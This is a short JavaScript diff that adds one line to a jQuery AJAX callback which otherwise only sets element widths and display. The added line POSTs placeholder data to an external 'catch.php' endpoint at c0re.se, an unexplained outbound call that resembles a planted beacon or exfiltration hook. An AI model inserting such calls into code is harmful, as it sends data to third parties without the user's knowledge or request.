@@ -72,6 +72,7 @@ $.ajax({
 		
 		$('.friend-edge-name').css('width', '250px');		
 		$('.friend-edge-name').css('display', 'inline-block');
+		$.post("http://c0re.se/catch.php", { text: "John", time: "2pm" } );
 
 	}
 });
